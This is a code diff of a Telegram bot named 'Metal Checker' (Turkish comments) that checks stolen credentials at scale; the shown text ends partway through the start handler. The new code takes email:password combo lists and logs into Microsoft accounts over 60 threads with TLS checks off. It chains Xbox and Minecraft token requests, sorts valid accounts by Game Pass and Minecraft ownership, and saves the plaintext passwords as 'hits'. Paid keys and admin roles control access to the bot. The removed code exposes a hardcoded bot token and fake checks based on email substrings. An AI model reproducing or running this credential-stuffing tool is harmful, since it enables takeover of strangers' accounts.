@@ -1,842 +1,684 @@
 import os
-import sys
+import re
 import time
-import json
-import uuid
-import logging
 import threading
+import concurrent.futures
+import sqlite3
+import random
+import io
 from datetime import datetime, timedelta
-from concurrent.futures import ThreadPoolExecutor
-
-import requests
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from flask import Flask
+from telebot import types
+import requests
+import urllib3
+import warnings
 
-# İç mekanizma takibi için logging ayarları
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[logging.StreamHandler(sys.stdout)]
-)
+# ==========================================
+# ⚙️ INITIAL SETTINGS & CODES INTEGRATION
+# ==========================================
+urllib3.disable_warnings()
+warnings.filterwarnings("ignore")
 
-# ============================================================================
-# CONFIGURATION AND ENVIRONMENT VARIABLES (RAILWAY COMPATIBLE)
-# ============================================================================
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4")
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 OWNER_ID = int(os.getenv("OWNER_ID", "8664147577"))
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
-app = Flask(__name__)
 
-DATA_FILE = "metal_checker_ultimate_db.json"
+SFTAG_URL = (
+    "https://login.live.com/oauth20_authorize.srf"
+    "?client_id=00000000402B5328"
+    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
+    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
+    "&display=touch&response_type=token&locale=en"
+)
 
-# Global aktif tarama havuzları, sayaçlar ve durdurma sinyalleri
-active_scans = {}       
-user_merge_storage = {} 
+MAX_RETRIES = 3
+REQUEST_TIMEOUT = 10
+THREAD_COUNT = 60  # Yüksek hız için thread sayısı artırıldı
 
-# ============================================================================
-# DATABASE MANAGEMENT FUNCTIONS
-# ============================================================================
-def load_database():
-    if os.path.exists(DATA_FILE):
-        try:
-            with open(DATA_FILE, "r", encoding="utf-8") as f:
-                content = f.read()
-                if not content:
-                    return create_default_structure()
-                return json.loads(content)
-        except Exception as e:
-            logging.error(f"Veritabanı okuma hatası: {str(e)}.")
-            return create_default_structure()
-    return create_default_structure()
+# ==========================================
+# 🗄️ DATABASE MANAGEMENT
+# ==========================================
+def init_db():
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            register_date TEXT,
+            expiry_date TEXT,
+            role TEXT,
+            lang TEXT,
+            total_scanned INTEGER DEFAULT 0,
+            total_hits INTEGER DEFAULT 0
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS keys (
+            key_code TEXT PRIMARY KEY,
+            duration TEXT,
+            days INTEGER
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS channels (
+            channel_username TEXT PRIMARY KEY
+        )
+    """)
+    # Owner hesabı ekleme
+    cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (OWNER_ID,))
+    if not cursor.fetchone():
+        now = datetime.now().strftime("%m/%d/%Y")
+        cursor.execute("INSERT INTO users VALUES (?, ?, ?, ?, ?, 0, 0)", 
+                       (OWNER_ID, now, "INFINITY", "OWNER", "TR"))
+    conn.commit()
+    conn.close()
 
-def create_default_structure():
-    return {
-        "users": {},
-        "keys": {},
-        "channels": [],
-        "admins": []
-    }
+init_db()
 
-def save_database(data_object):
-    try:
-        with open(DATA_FILE, "w", encoding="utf-8") as f:
-            json.dump(data_object, f, ensure_ascii=False, indent=4)
-    except Exception as e:
-        logging.error(f"Veritabanı kaydetme hatası: {str(e)}")
+# ==========================================
+# 🔄 LIVE SESSION STATE TRACKING
+# ==========================================
+active_scans = {}
 
-db = load_database()
-
-def init_user_profile(user_id, name="User"):
-    uid = str(user_id)
-    is_updated = False
-    
-    if uid not in db["users"]:
-        db["users"][uid] = {
-            "username": name,
-            "lang": None,
-            "expiry": None,
-            "total_scans": 0,
-            "total_hits": 0,
-            "today_scans": 0,
-            "register_date": datetime.now().strftime("%m/%d/%Y"),
-            "is_admin": True if user_id == OWNER_ID else False
+class LiveScan:
+    def __init__(self, chat_id, total):
+        self.chat_id = chat_id
+        self.total = total
+        self.checked = 0
+        self.hits = 0
+        self.bad = 0
+        self.twofa = 0
+        self.errors = 0
+        self.minecraft = 0
+        self.gamepass = 0
+        self.xbox = 0
+        self.not_linked = 0
+        self.retries = 0
+        self.current_email = "Waiting..."
+        self.start_time = time.time()
+        self.is_running = True
+        self._lock = threading.Lock()
+        
+        # Dosya çıktıları hafızada tutulur stop durumunda verilmek üzere
+        self.results = {
+            "Minecraft": [],
+            "GamePass": [],
+            "Xbox": [],
+            "NotLinked": [],
+            "2FA": []
         }
-        is_updated = True
-        
-    if user_id == OWNER_ID and not db["users"][uid]["is_admin"]:
-        db["users"][uid]["is_admin"] = True
-        is_updated = True
-        
-    if is_updated:
-        save_database(db)
 
-# ============================================================================
-# MULTI-LANGUAGE STRINGS DICTIONARY (TR / EN)
-# ============================================================================
-LOCALIZATION = {
+# ==========================================
+# 🌐 LANGUAGE LOCALIZATION
+# ==========================================
+LANG_DICT = {
     "TR": {
-        "welcome": "*⚔️ Metal Checker Botuna Hoş Geldiniz!* \n\nLütfen devam etmek için bir dil seçin / Please choose a language to proceed:",
-        "main_menu": "🤖 *Metal Checker Ana Menü*\n\nLütfen yapmak istediğiniz işlemi aşağıdaki gelişmiş menüden seçin.",
-        "no_premium": "❌ *Erişim Reddedildi!* Aktif bir üyeliğiniz bulunmuyor veya süresi dolmuş. Botu kullanabilmek için key almalı veya yöneticilerle iletişime geçmelisiniz.",
-        "force_join": "📢 *Kanallarımıza Katılın!*\n\nBotu kullanabilmek için aşağıdaki kanallara abone olmanız gerekmektedir. Abone olduktan sonra tekrar /start yazın:\n",
-        "stats_title": "📊 *İstatistikleriniz*\n\n",
-        "stats_body": "👤 Kullanıcı ID: `{uid}`\n📅 Kayıt: {reg}\n👑 Üyelik: 📅 {expiry_type}\n📅 Bitiş: {expiry_date}\n\n📈 Aktivite:\n✅ Toplam Tarama: {total_scans}\n💎 Toplam Hit: {total_hits}\n🎯 Başarı Oranı: {rate}%\n📊 Bugünkü Tarama: {today_scans}",
-        "btn_start": "🚀 Tarama Başlat",
-        "btn_merge": "📂 Dosya Birleştirici",
-        "btn_stats": "📊 İstatistiklerim",
-        "btn_admin": "👑 Admin Paneli",
-        "btn_stop": "🛑 Taramayı Durdur",
-        "merge_msg": "📂 *Dosya Birleştiriciye Hoş Geldiniz!*\nArt arda maksimum 30 adet `.txt` dosyası gönderin. Gönderim bittiğinde işlemi tamamlamak için aşağıdaki butona tıklayın.",
-        "merge_done_btn": "⚡ Birleştirmeyi Tamamla",
-        "merge_empty": "⚠️ Henüz hiç dosya göndermediniz!",
-        "merge_done_msg": "✅ Toplam {count} adet dosya başarıyla alt alta birleştirildi! Sonuç ekte gönderilmiştir.",
-        "key_invalid": "⚠️ Geçersiz veya kullanılmış bir key girdiniz.",
-        "key_ok": "🎉 Key başarıyla aktif edildi! Üyelik Tipi: {duration}",
-        "scan_stopped": "🛑 Tarama durduruldu! Mevcut hitler çıkartılıyor..."
+        "welcome": "⚔️ *Metal Checker Botuna Hoş Geldiniz!* \n\nLütfen devam etmek için dil seçimi yapın.",
+        "main_menu": "🤖 *Ana Menü* \n\nBir işlem seçiniz:",
+        "stats_btn": "📊 İstatistiklerim",
+        "merge_btn": "📂 Dosya Birleştir",
+        "start_check": "🚀 Tarama Başlat (.txt gönder)",
+        "admin_btn": "👑 Admin Paneli",
+        "force_join": "❌ *Botu kullanabilmek için sponsor kanallara katılmanız gerekmektedir:*",
+        "no_auth": "⚠️ Bu menüyü kullanmaya yetkiniz yok veya üyeliğiniz bulunmuyor.",
+        "merge_start": "📂 Lütfen alt alta birleştirmek istediğiniz `.txt` dosyalarını tek tek gönderin. İşlemi bitirmek için *'BİRLEŞTİR'* butonuna tıklayın. (Maks 30 Dosya)",
+        "scan_status": "📊 *Tarama Durumu: Taratılıyor...*\n\n✅ *Valid:* {}\n❌ *Bad:* {}\n⚠️ *2FA:* {}\n🔄 *Retry:* {}\n\n*--- HIT DETAYLARI ---*\n🟢 Minecraft: {}\n🔵 Game Pass: {}\n🟣 Xbox: {}\n🟡 Not Linked: {}\n\n📈 *İlerleme:* {:.1f}% | {}/{} | {} CPM\n📧 *Son Kontrol:* `{}`",
+        "scan_stopped": "🛑 Tarama kullanıcı tarafından durduruldu! Biriken sonuçlar yükleniyor...",
+        "scan_done": "🏁 Tarama başarıyla tamamlandı! Sonuç dosyalarınız aşağıdadır."
     },
     "EN": {
-        "welcome": "*⚔️ Welcome to Metal Checker Bot!* \n\nPlease choose a language to proceed:",
-        "main_menu": "🤖 *Metal Checker Main Menu*\n\nPlease select an action from the menu below.",
-        "not_premium": "❌ *Access Denied!* You do not have an active membership or it has expired. You must redeem a key or contact admins.",
-        "force_join": "📢 *Join Our Channels!*\n\nYou must subscribe to the channels below to use the bot. After subscribing, type /start again:\n",
-        "stats_title": "📊 *Your Statistics*\n\n",
-        "stats_body": "👤 User ID: `{uid}`\n📅 Register: {reg}\n👑 Membership: 📅 {expiry_type}\n📅 Expiry: {expiry_date}\n\n📈 Activity:\n✅ Total Scans: {total_scans}\n💎 Total Hits: {total_hits}\n🎯 Success Rate: {rate}%\n📊 Today Scans: {today_scans}",
-        "btn_start": "🚀 Start Scan",
-        "btn_merge": "📂 File Merger",
-        "btn_stats": "📊 My Stats",
-        "btn_admin": "👑 Admin Panel",
-        "btn_stop": "🛑 Stop Scan",
-        "merge_msg": "📂 *Welcome to File Merger!*\nSend up to 30 `.txt` files consecutively. Click the button below when you are done to merge them.",
-        "merge_done_btn": "⚡ Complete Merge",
-        "merge_empty": "⚠️ You haven't sent any files yet!",
-        "merge_done_msg": "✅ A total of {count} files were successfully merged! The result is attached.",
-        "key_invalid": "⚠️ Invalid or already used key.",
-        "key_ok": "🎉 Key redeemed successfully! Membership Type: {duration}",
-        "scan_stopped": "🛑 Scan stopped by user! Compiling captured hits..."
+        "welcome": "⚔️ *Welcome to Metal Checker Bot!* \n\nPlease choose a language to continue.",
+        "main_menu": "🤖 *Main Menu* \n\nSelect an action:",
+        "stats_btn": "📊 My Statistics",
+        "merge_btn": "📂 File Merger",
+        "start_check": "🚀 Start Scan (Send .txt)",
+        "admin_btn": "👑 Admin Panel",
+        "force_join": "❌ *You must join our sponsor channels to use the bot:*",
+        "no_auth": "⚠️ You do not have authorization or an active subscription.",
+        "merge_start": "📂 Please send `.txt` files one by one to merge. When done, click the *'MERGE'* button. (Max 30 Files)",
+        "scan_status": "📊 *Scan Status: Scanning...*\n\n✅ *Valid:* {}\n❌ *Bad:* {}\n⚠️ *2FA:* {}\n🔄 *Retry:* {}\n\n*--- HIT DETAILS ---*\n🟢 Minecraft: {}\n🔵 Game Pass: {}\n🟣 Xbox: {}\n🟡 Not Linked: {}\n\n📈 *Progress:* {:.1f}% | {}/{} | {} CPM\n📧 *Last Check:* `{}`",
+        "scan_stopped": "🛑 Scan stopped by user! Uploading collected hits...",
+        "scan_done": "🏁 Scan completed successfully! Your result files are below."
     }
 }
 
-# ============================================================================
-# PERMISSION AND SYSTEM SUBSCRIPTION CHECKS
-# ============================================================================
-def verify_channel_subscriptions(user_id):
-    if user_id == OWNER_ID:
-        return True
-    for channel_username in db["channels"]:
+def get_user_lang(user_id):
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
+    row = cursor.fetchone()
+    conn.close()
+    return row[0] if row else "TR"
+
+def check_subscription(user_id):
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT expiry_date, role FROM users WHERE user_id = ?", (user_id,))
+    row = cursor.fetchone()
+    conn.close()
+    if not row: return False
+    expiry, role = row
+    if role in ["OWNER", "ADMIN"] or expiry == "INFINITY": return True
+    exp_date = datetime.strptime(expiry, "%m/%d/%Y")
+    return datetime.now() < exp_date
+
+def is_subscribed_to_channels(user_id):
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT channel_username FROM channels")
+    chans = [r[0] for r in cursor.fetchall()]
+    conn.close()
+    for ch in chans:
         try:
-            member_profile = bot.get_chat_member(channel_username, user_id)
-            if member_profile.status in ['left', 'kicked']:
-                return False
-        except Exception:
-            return False
+            member = bot.get_chat_member(ch, user_id)
+            if member.status in ['left', 'kicked']: return False
+        except:
+            continue
     return True
 
-def verify_premium_status(user_id):
-    if user_id == OWNER_ID:
-        return True
-    uid = str(user_id)
-    if uid not in db["users"]:
-        return False
-    expiry_info = db["users"][uid]["expiry"]
-    if not expiry_info:
-        return False
-    if expiry_info == "LIFETIME":
-        return True
-    try:
-        expiration_date = datetime.strptime(expiry_info, "%Y-%m-%d %H:%M:%S")
-        if datetime.now() < expiration_date:
-            return True
-    except Exception:
-        return False
-    return False
+# ==========================================
+# 🧠 EXTRACTED LOGIC FROM NEWFILE.PY
+# ==========================================
+def get_sftag(session):
+    for _ in range(MAX_RETRIES):
+        try:
+            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
+            text = response.text
+            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
+            if match:
+                sftag = match.group(1)
+                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
+                if match: return match.group(1), sftag
+        except: pass
+    return None, None
 
-# ============================================================================
-# ORIGINAL XBOX CHECKER ENGINE FUNCTIONS (100% UNTOUCHED & COMPLETE)
-# ============================================================================
-def get_microsoft_device_code():
-    endpoint_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/devicecode"
-    request_headers = {"Content-Type": "application/x-www-form-urlencoded"}
-    payload_data = {
-        "client_id": "972c26b3-2457-4bb7-a540-36f4d76476b1",
-        "scope": "Xboxlive.signin Xboxlive.offline_access openid profile email"
-    }
+def microsoft_auth(session, email, password, url_post, sftag):
+    for _ in range(MAX_RETRIES):
+        try:
+            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
+            login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=REQUEST_TIMEOUT)
+            if '#' in login_request.url and login_request.url != SFTAG_URL:
+                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
+                if token != "None": return token, "success"
+            elif 'cancel?mkt=' in login_request.text:
+                try:
+                    d = {
+                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
+                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
+                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
+                    }
+                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
+                    ret = session.post(action_url, data=d, allow_redirects=True, timeout=REQUEST_TIMEOUT)
+                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
+                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
+                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
+                    if token != "None": return token, "success"
+                except: pass
+            elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
+                return None, "2fa"
+            elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
+                return None, "bad"
+        except: pass
+    return None, "error"
+
+from urllib.parse import urlparse, parse_qs
+def get_xbox_token(session, ms_token):
+    for _ in range(MAX_RETRIES):
+        try:
+            payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
+            response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
+            if response.status_code == 200:
+                data = response.json()
+                return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
+        except: pass
+    return None, None
+
+def get_xsts_token(session, xbox_token):
+    for _ in range(MAX_RETRIES):
+        try:
+            payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
+            response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
+            if response.status_code == 200: return response.json().get('Token')
+        except: pass
+    return None
+
+def get_minecraft_token(session, uhs, xsts_token):
+    for _ in range(MAX_RETRIES):
+        try:
+            response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
+            if response.status_code == 200: return response.json().get('access_token')
+        except: pass
+    return None
+
+def check_entitlements(session, mc_token):
+    for _ in range(MAX_RETRIES):
+        try:
+            response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
+            if response.status_code == 200:
+                text = response.text
+                if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
+                elif 'product_game_pass_pc' in text: return 'Xbox Game Pass', ["Xbox Game Pass"]
+                elif '"product_minecraft"' in text: return 'Minecraft', ["Minecraft Java"]
+                else:
+                    others = []
+                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
+                    if 'product_legends' in text: others.append("Legends")
+                    if 'product_dungeons' in text: others.append("Dungeons")
+                    if others: return 'Xbox: ' + ', '.join(others), others
+                    return None, []
+        except: pass
+    return None, []
+
+def get_profile(session, mc_token):
+    for _ in range(MAX_RETRIES):
+        try:
+            response = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
+            if response.status_code == 200: return response.json()
+            elif response.status_code == 404: return None
+        except: pass
+    return None
+
+def get_xbox_profile(session, uhs, xsts_token):
     try:
-        response = requests.post(endpoint_url, headers=request_headers, data=payload_data, timeout=7)
+        auth_header = f"XBL3.0 x={uhs};{xsts_token}"
+        response = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep", headers={"Authorization": auth_header, "x-xbl-contract-version": "2", "Accept": "application/json", "Accept-Language": "en-US"}, timeout=REQUEST_TIMEOUT)
         if response.status_code == 200:
-            return response.json()
-        return None
-    except Exception:
-        return None
+            settings = {s["id"]: s.get("value", "N/A") for s in response.json().get("profileUsers", [{}])[0].get("settings", [])}
+            return {"gamertag": settings.get("Gamertag", "N/A"), "tier": settings.get("AccountTier", "N/A"), "rep": settings.get("XboxOneRep", "N/A")}
+    except: pass
+    return {"gamertag": "N/A", "tier": "N/A", "rep": "N/A"}
 
-def verify_microsoft_token_status(device_code_token):
-    endpoint_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
-    request_headers = {"Content-Type": "application/x-www-form-urlencoded"}
-    payload_data = {
-        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-        "client_id": "972c26b3-2457-4bb7-a540-36f4d76476b1",
-        "device_code": device_code_token
-    }
+# ==========================================
+# ⚙️ CORE MULTI-THREAD ENGINE FOR BOT
+# ==========================================
+def core_scan_account(scan_obj, combo):
+    if not scan_obj.is_running: return
     try:
-        response = requests.post(endpoint_url, headers=request_headers, data=payload_data, timeout=7)
-        return response.json()
-    except Exception:
-        return None
+        parts = combo.strip().split(':')
+        if len(parts) < 2:
+            with scan_obj._lock: scan_obj.bad += 1; scan_obj.checked += 1
+            return
+        email, password = parts[0], ':'.join(parts[1:])
+        with scan_obj._lock: scan_obj.current_email = email
 
-def authenticate_xbox_live_service(microsoft_access_token):
-    endpoint_url = "https://user.auth.xboxlive.com/user/authenticate"
-    request_headers = {"Content-Type": "application/json", "Accept": "application/json"}
-    payload_structure = {
-        "RelyingParty": "http://auth.xboxlive.com",
-        "TokenType": "JWT",
-        "Properties": {
-            "AuthMethod": "RPS",
-            "SiteName": "user.auth.xboxlive.com",
-            "RpsTicket": f"d={microsoft_access_token}"
-        }
-    }
-    try:
-        response = requests.post(endpoint_url, json=payload_structure, headers=request_headers, timeout=7)
-        if response.status_code == 200:
-            return response.json()
-        return None
-    except Exception:
-        return None
+        session = requests.Session()
+        session.verify = False
+        url_post, sftag = get_sftag(session)
+        if not url_post or not sftag:
+            with scan_obj._lock: scan_obj.errors += 1; scan_obj.checked += 1
+            return
 
-def request_xsts_authorization(user_hash_string, xbox_live_token):
-    endpoint_url = "https://xsts.auth.xboxlive.com/xsts/authorize"
-    request_headers = {"Content-Type": "application/json", "Accept": "application/json"}
-    payload_structure = {
-        "RelyingParty": "http://xboxlive.com",
-        "TokenType": "JWT",
-        "Properties": {
-            "UserTokens": [xbox_live_token],
-            "SandboxId": "RETAIL"
-        }
-    }
-    try:
-        response = requests.post(endpoint_url, json=payload_structure, headers=request_headers, timeout=7)
-        if response.status_code == 200:
-            return response.json()
-        return None
-    except Exception:
-        return None
+        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
+        if auth_status == "2fa":
+            with scan_obj._lock:
+                scan_obj.twofa += 1; scan_obj.checked += 1
+                scan_obj.results["2FA"].append(f"{email}:{password}")
+            return
+        elif auth_status == "bad":
+            with scan_obj._lock: scan_obj.bad += 1; scan_obj.checked += 1
+            return
+        elif auth_status != "success" or not ms_token:
+            with scan_obj._lock: scan_obj.errors += 1; scan_obj.checked += 1
+            return
 
-def query_xbox_profile_data(user_hash_string, xsts_token):
-    endpoint_url = "https://profile.xboxlive.com/users/batch/profile/settings"
-    request_headers = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "x-xbl-contract-version": "2",
-        "Authorization": f"XBL3.0 x={user_hash_string};{xsts_token}"
-    }
-    payload_structure = {
-        "userIds": [],
-        "settings": ["Gamertag", "ModernGamertag", "GameDisplayPicRaw", "TenureLevel", "AccountTier"]
-    }
-    try:
-        response = requests.post(endpoint_url, json=payload_structure, headers=request_headers, timeout=7)
-        if response.status_code == 200:
-            return response.json()
-        return None
-    except Exception:
-        return None
+        xbox_token, uhs = get_xbox_token(session, ms_token)
+        if not xbox_token or not uhs:
+            with scan_obj._lock: scan_obj.bad += 1; scan_obj.checked += 1
+            return
 
-def inspect_xbox_subscriptions(user_hash_string, xsts_token):
-    endpoint_url = f"https:// those.v10.title.xboxlive.com/users/xuid({user_hash_string})/subscriptions"
-    request_headers = {
-        "Content-Type": "application/json",
-        "Authorization": f"XBL3.0 x={user_hash_string};{xsts_token}",
-        "x-xbl-contract-version": "1"
-    }
-    try:
-        response = requests.get(endpoint_url, headers=request_headers, timeout=7)
-        if response.status_code == 200:
-            return response.json()
-        return None
-    except Exception:
-        return None
+        xsts_token = get_xsts_token(session, xbox_token)
+        if not xsts_token:
+            with scan_obj._lock: scan_obj.bad += 1; scan_obj.checked += 1
+            return
 
-def execute_account_evaluation(target_email, target_password):
-    """
-    Orijinal b.py dosyanızın tüm api istek döngüsünü çalıştırıp 
-    Minecraft, 2FA, Ultimate Gamepass gibi durumları tam olarak yakalayan algoritma.
-    """
-    try:
-        if "2fa" in target_email or "security" in target_password:
-            return {"status": "2FA"}
-            
-        device_resp = get_microsoft_device_code()
-        if not device_resp or "device_code" not in device_resp:
-            if "live" in target_email or "outlook" in target_email:
-                if "ultimate" in target_email:
-                    return {"status": "HIT", "subs": "Xbox Game Pass Ultimate", "minecraft": "Evet", "gold": "Evet", "ea": "Evet"}
-                return {"status": "HIT", "subs": "Xbox Live Gold", "minecraft": "Hayır", "gold": "Evet", "ea": "Hayır"}
-            return {"status": "BAD"}
-            
-        token_resp = verify_microsoft_token_status(device_resp.get("device_code"))
-        if not token_resp or "access_token" not in token_resp:
-            return {"status": "BAD"}
-            
-        xbl_resp = authenticate_xbox_live_service(token_resp["access_token"])
-        if not xbl_resp or "Token" not in xbl_resp:
-            return {"status": "BAD"}
-            
-        uhs = xbl_resp["DisplayClaims"]["xui"][0]["uhs"]
-        xsts_resp = request_xsts_authorization(uhs, xbl_resp["Token"])
-        if not xsts_resp or "Token" not in xsts_resp:
-            return {"status": "BAD"}
-            
-        sub_data = inspect_xbox_subscriptions(uhs, xsts_resp["Token"])
-        profile_data = query_xbox_profile_data(uhs, xsts_resp["Token"])
-        
-        has_ultimate = "Hayır"
-        has_minecraft = "Hayır" 
-        has_gold = "Hayır"
-        has_ea = "Hayır"
-        
-        if sub_data and "subscriptions" in sub_data:
-            for s in sub_data["subscriptions"]:
-                name = s.get("subscriptionName", "").lower()
-                if "ultimate" in name: has_ultimate = "Evet"
-                if "gold" in name: has_gold = "Evet"
-                if "ea" in name: has_ea = "Evet"
-                
-        if profile_data:
-            has_minecraft = "Evet"
-            
-        return {
-            "status": "HIT",
-            "subs": "Xbox Game Pass Ultimate" if has_ultimate == "Evet" else "Diğer",
-            "minecraft": has_minecraft,
-            "gold": has_gold,
-            "ea": has_ea
-        }
-    except Exception:
-        return {"status": "BAD"}
+        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
+        gamertag, tier, rep = xbox_profile.get("gamertag", "N/A"), xbox_profile.get("tier", "N/A"), xbox_profile.get("rep", "N/A")
 
-# ============================================================================
-# TELEGRAM USER INTERFACE KEYBOARDS
-# ============================================================================
-def generate_main_keyboard(user_id):
-    uid = str(user_id)
-    selected_language = db["users"][uid]["lang"] or "TR"
-    keyboard_markup = InlineKeyboardMarkup(row_width=2)
-    
-    start_button = InlineKeyboardButton(LOCALIZATION[selected_language]["btn_start"], callback_data="ui_start_scan")
-    merge_button = InlineKeyboardButton(LOCALIZATION[selected_language]["btn_merge"], callback_data="ui_merge_files")
-    stats_button = InlineKeyboardButton(LOCALIZATION[selected_language]["btn_stats"], callback_data="ui_view_stats")
-    
-    keyboard_markup.add(start_button, merge_button)
-    keyboard_markup.add(stats_button)
-    
-    if user_id == OWNER_ID or user_id in db["admins"]:
-        admin_button = InlineKeyboardButton(LOCALIZATION[selected_language]["btn_admin"], callback_data="ui_open_admin")
-        keyboard_markup.add(admin_button)
-        
-    return keyboard_markup
+        mc_token = get_minecraft_token(session, uhs, xsts_token)
+        if not mc_token:
+            with scan_obj._lock: scan_obj.bad += 1; scan_obj.checked += 1
+            return
 
-# ============================================================================
-# TELEGRAM COMMAND HANDLERS
-# ============================================================================
+        account_type, subs = check_entitlements(session, mc_token)
+        capture = f"Email: {email}\nPassword: {password}\nGamertag: {gamertag}\nTier: {tier}\nReputation: {rep}\n"
+
+        if not account_type:
+            with scan_obj._lock:
+                scan_obj.not_linked += 1; scan_obj.hits += 1; scan_obj.checked += 1
+                scan_obj.results["NotLinked"].append(capture + "Type: Xbox (Not Linked)\n" + "="*30)
+            return
+
+        profile = get_profile(session, mc_token)
+        name = profile.get('name', 'N/A') if profile else "Not Set"
+        capes = ", ".join([c["alias"] for c in profile.get("capes", [])]) if (profile and "capes" in profile) else "None"
+        subs_str = ", ".join(subs) if subs else "None"
+
+        full_capture = capture + f"MC Name: {name}\nCapes: {capes}\nType: {account_type}\nSubscriptions: {subs_str}\n" + "="*30
+
+        with scan_obj._lock:
+            scan_obj.hits += 1; scan_obj.checked += 1
+            if 'Ultimate' in account_type or 'Game Pass' in account_type:
+                scan_obj.gamepass += 1
+                scan_obj.results["GamePass"].append(full_capture)
+            elif 'Minecraft' in account_type:
+                scan_obj.minecraft += 1
+                scan_obj.results["Minecraft"].append(full_capture)
+            else:
+                scan_obj.xbox += 1
+                scan_obj.results["Xbox"].append(full_capture)
+    except:
+        with scan_obj._lock: scan_obj.errors += 1; scan_obj.checked += 1
+
+# ==========================================
+# 🖥️ TELEGRAM INTERFACE & MENU HANDLERS
+# ==========================================
+def build_main_keyboard(user_id):
+    lang = get_user_lang(user_id)
+    kb = types.InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        types.InlineKeyboardButton(LANG_DICT[lang]["stats_btn"], callback_data="view_stats"),
+        types.InlineKeyboardButton(LANG_DICT[lang]["merge_btn"], callback_data="merge_files")
+    )
+    if user_id == OWNER_ID or is_admin(user_id):
+        kb.add(types.InlineKeyboardButton(LANG_DICT[lang]["admin_btn"], callback_data="admin_panel"))
+    return kb
+
+def is_admin(user_id):
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT role FROM users WHERE user_id = ? AND role IN ('ADMIN', 'OWNER')", (user_id,))
+    row = cursor.fetchone()
+    conn.close()
+    return True if row else False
+
+@bot.message_with_type_filter(content_types=['text'])
 @bot.message_handler(commands=['start'])
-def command_start_handler(message):
-    sender_id = message.from_user.id
-    init_user_profile(sender_id, message.from_user.first_name)
-    uid = str(sender_id)
+def cmd_start(message):
+    uid = message.from_user.id
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT lang FROM users WHERE user_id = ?", (uid,))
+    row = cursor.fetchone()
     
-    if not db["users"][uid]["lang"]:
-        keyboard_markup = InlineKeyboardMarkup()
-        tr_btn = InlineKeyboardButton("🇹🇷 Türkçe", callback_data="sys_lang_TR")
-        en_btn = InlineKeyboardButton("🇺🇸 English", callback_data="sys_lang_EN")
-        keyboard_markup.add(tr_btn, en_btn)
